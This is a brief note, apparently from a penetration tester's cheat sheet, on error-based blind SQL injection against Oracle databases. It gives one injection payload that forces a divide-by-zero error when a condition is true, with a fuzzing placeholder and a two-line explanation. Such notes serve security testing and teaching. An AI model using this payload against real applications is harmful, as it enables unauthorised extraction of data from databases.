# Causing error oracle database

<mark style="color:yellow;">'||(SELECT CASE WHEN (1=§1§) THEN TO\_CHAR(1/0) ELSE NULL END FROM dual)||';</mark>



If 1=1 then 1/0 == It will trigger the error cause 1/0 is not possible

if 1=2 == it will trigger " else null end from dual
